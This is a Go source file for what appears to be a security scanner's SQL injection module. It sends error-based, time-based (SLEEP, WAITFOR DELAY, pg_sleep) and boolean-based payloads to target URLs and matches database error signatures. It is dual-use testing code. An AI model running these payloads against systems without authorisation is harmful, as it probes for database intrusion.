package scanner

import (
	"bugx/pkg/utils"
	"fmt"
	"math"
	"strings"
	"sync"
	"time"
)

type SQLiScanner struct{}

// SQL error signatures for different databases - from sqlmap
var sqlErrorSignatures = map[string][]string{
	"MySQL": {
		"SQL syntax.*MySQL",
		"Warning.*mysql_",
		"MySqlException",
		"valid MySQL result",
		"check the manual that corresponds to your (MySQL|MariaDB) server version",
		"MySqlClient\\.",
		"com\\.mysql\\.jdbc",
		"Unclosed quotation mark after the character string",
	},
	"PostgreSQL": {
		"PostgreSQL.*ERROR",
		"Warning.*\\Wpg_",
		"valid PostgreSQL result",
		"Npgsql\\.",
		"PG::SyntaxError:",
		"org\\.postgresql\\.util\\.PSQLException",
		"ERROR:\\s+syntax error at or near",
	},
	"MSSQL": {
		"Driver.* SQL[\\-_ ]*Server",
		"OLE DB.* SQL Server",
		"\\bSQL Server[^&lt;]+Driver",
		"Warning.*mssql_",
		"\\bSQL Server[^&lt;]+[0-9a-fA-F]{8}",
		"System\\.Data\\.SqlClient\\.",
		"Exception.*\\WSystem\\.Data\\.SqlClient\\.",
		"Unclosed quotation mark after the character string",
		"com\\.microsoft\\.sqlserver\\.jdbc",
	},
	"Oracle": {
		"\\bORA-[0-9][0-9][0-9][0-9]",
		"Oracle error",
		"Oracle.*Driver",
		"Warning.*\\Woci_",
		"Warning.*\\Wora_",
		"oracle\\.jdbc\\.driver",
		"quoted string not properly terminated",
	},
	"SQLite": {
		"SQLite/JDBCDriver",
		"SQLite\\.Exception",
		"System\\.Data\\.SQLite\\.SQLiteException",
		"Warning.*sqlite_",
		"Warning.*SQLite3::",
		"\\[SQLITE_ERROR\\]",
		"SQLite error \\d+:",
		"sqlite3\\.OperationalError:",
	},
}

// Time-based payloads with expected delays
var timeBasedPayloads = []struct {
	Payload       string
	ExpectedDelay float64
	DBType        string
}{
	{"' AND SLEEP(5)--", 5.0, "MySQL"},
	{"' AND SLEEP(5)#", 5.0, "MySQL"},
	{"1' AND SLEEP(5)--", 5.0, "MySQL"},
	{"'; WAITFOR DELAY '0:0:5'--", 5.0, "MSSQL"},
	{"1'; WAITFOR DELAY '0:0:5'--", 5.0, "MSSQL"},
	{"'; SELECT pg_sleep(5)--", 5.0, "PostgreSQL"},
	{"1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5.0, "MySQL"},
	{"' OR SLEEP(5)--", 5.0, "MySQL"},
	{") OR SLEEP(5)--", 5.0, "MySQL"},
}

// Boolean-based payloads
var booleanPayloads = []struct {
	TruePayload  string
	FalsePayload string
}{
	{"' AND '1'='1", "' AND '1'='2"},
	{"' AND 1=1--", "' AND 1=2--"},
	{"1 AND 1=1", "1 AND 1=2"},
	{" AND 1=1", " AND 1=2"},
	{"' OR '1'='1", "' OR '1'='2"},
}

func (s *SQLiScanner) Scan(config ScanConfig) []ScanResult {
	var processor ResultProcessor
	var wg sync.WaitGroup
	sem := make(chan struct{}, config.Threads)

	fmt.Println(utils.Yellow("\n[i] Starting SQLi Scan..."))
	fmt.Println(utils.White("[*] Methods: Error-based, Time-based (5s delay), Boolean-based"))
	fmt.Println(utils.White("[*] Only CONFIRMED vulnerabilities will be reported\n"))

	for _, url := range config.URLs {
		wg.Add(1)
		sem <- struct{}{}
		go func(url string) {
			defer wg.Done()
			defer func() { <-sem }()

			// Get baseline response
			baseline, err := utils.MakeRequest(url, config.Cookie, config.Timeout)
			if err != nil {
				return
			}

			// 1. Error-based detection
			for _, payload := range config.Payloads {
				targetURL := url + payload
				resp, err := utils.MakeRequest(targetURL, config.Cookie, config.Timeout)
				if err != nil {
					continue
				}

				for dbType, patterns := range sqlErrorSignatures {
					for _, pattern := range patterns {
						if utils.RegexMatch(pattern, resp.Body) {
							// Verify it's not in baseline
							if !utils.RegexMatch(pattern, baseline.Body) {
								fmt.Printf("%s %s\n",
									utils.Red("[✓] SQLi CONFIRMED (Error-based):"),
									utils.Cyan(targetURL))
								fmt.Printf("    → Database: %s, Pattern matched: %s\n",
									utils.Yellow(dbType),
									utils.White(truncateURL(pattern, 50)))

								processor.Add(ScanResult{
									URL:        targetURL,
									Vulnerable: true,
									Payload:    payload,
									Details:    fmt.Sprintf("Error-based SQLi - %s detected", dbType),
								})
								goto nextPayload
							}
						}
					}
				}
			nextPayload:
			}

			// 2. Time-based detection (most reliable)
			fmt.Printf("%s %s\n", utils.White("[*] Testing time-based on:"), utils.Cyan(truncateURL(url, 60)))

			// First, measure baseline response time
			var baselineTimes []float64
			for i := 0; i < 3; i++ {
				start := time.Now()
				_, err := utils.MakeRequest(url, config.Cookie, config.Timeout)
				if err == nil {
					baselineTimes = append(baselineTimes, time.Since(start).Seconds())
				}
			}

			avgBaseline := 0.0
			for _, t := range baselineTimes {
				avgBaseline += t
			}
			if len(baselineTimes) > 0 {
				avgBaseline /= float64(len(baselineTimes))
			}

			for _, tbPayload := range timeBasedPayloads {
				targetURL := url + tbPayload.Payload

				start := time.Now()
				_, err := utils.MakeRequest(targetURL, config.Cookie, config.Timeout+10)
				elapsed := time.Since(start).Seconds()

				if err != nil {
					continue
				}

				// Check if response took significantly longer (expected delay - tolerance)
				expectedMin := tbPayload.ExpectedDelay - 1.0 // 1 second tolerance
				actualDelay := elapsed - avgBaseline

				if actualDelay >= expectedMin {
					// Verify with second request
					start2 := time.Now()
					_, _ = utils.MakeRequest(targetURL, config.Cookie, config.Timeout+10)
					elapsed2 := time.Since(start2).Seconds()

					if elapsed2-avgBaseline >= expectedMin {
						fmt.Printf("%s %s\n",
							utils.Red("[✓] SQLi CONFIRMED (Time-based):"),
							utils.Cyan(targetURL))
						fmt.Printf("    → Database: %s, Delay: %ss (baseline: %.2fs)\n",
							utils.Yellow(tbPayload.DBType),
							utils.White(fmt.Sprintf("%.2f", elapsed)),
							avgBaseline)

						processor.Add(ScanResult{
							URL:          targetURL,
							Vulnerable:   true,
							Payload:      tbPayload.Payload,
							ResponseTime: elapsed,
							Details:      fmt.Sprintf("Time-based SQLi - %s (%.2fs delay)", tbPayload.DBType, elapsed),
						})
						break // Found time-based, no need to test more
					}
				}
			}

			// 3. Boolean-based detection
			for _, bp := range booleanPayloads {
				trueURL := url + bp.TruePayload
				falseURL := url + bp.FalsePayload

				trueResp, err1 := utils.MakeRequest(trueURL, config.Cookie, config.Timeout)
				falseResp, err2 := utils.MakeRequest(falseURL, config.Cookie, config.Timeout)

				if err1 != nil || err2 != nil {
					continue
				}

				// Calculate response difference
				lenDiff := math.Abs(float64(len(trueResp.Body) - len(falseResp.Body)))
				baseLen := float64(len(baseline.Body))

				// Significant difference (>10% of baseline)
				if lenDiff > baseLen*0.1 && lenDiff > 100 {
					// Verify true response is similar to baseline
					trueDiff := math.Abs(float64(len(trueResp.Body) - len(baseline.Body)))
					if trueDiff < baseLen*0.1 {
						fmt.Printf("%s %s\n",
							utils.Red("[✓] SQLi CONFIRMED (Boolean-based):"),
							utils.Cyan(trueURL))
						fmt.Printf("    → True/False response diff: %.0f bytes\n", lenDiff)

						processor.Add(ScanResult{
							URL:        trueURL,
							Vulnerable: true,
							Payload:    bp.TruePayload,
							Details:    fmt.Sprintf("Boolean-based SQLi (diff: %.0f bytes)", lenDiff),
						})
						break
					}
				}
			}

		}(url)
	}

	wg.Wait()
	printSQLiSummary(processor.Results)
	return processor.Results
}

func printSQLiSummary(results []ScanResult) {
	errorBased, timeBased, booleanBased := 0, 0, 0
	for _, r := range results {
		if strings.Contains(r.Details, "Error-based") {
			errorBased++
		} else if strings.Contains(r.Details, "Time-based") {
			timeBased++
		} else if strings.Contains(r.Details, "Boolean-based") {
			booleanBased++
		}
	}

	fmt.Println(utils.Yellow("\n--------------------------------------------------"))
	fmt.Println(utils.White("SQLi Scan Summary:"))
	fmt.Printf("  %s Error-based: %d\n", utils.Red("●"), errorBased)
	fmt.Printf("  %s Time-based: %d\n", utils.Red("●"), timeBased)
	fmt.Printf("  %s Boolean-based: %d\n", utils.Red("●"), booleanBased)
	fmt.Printf("  %s Total CONFIRMED: %d\n", utils.Green("★"), len(results))
	fmt.Println(utils.Yellow("--------------------------------------------------"))

	if len(results) > 0 {
		fmt.Println(utils.Green("\n[!] All findings are VERIFIED - exploitation possible!"))
	} else {
		fmt.Println(utils.Yellow("\n[i] No confirmed SQL injection vulnerabilities found."))
	}
}
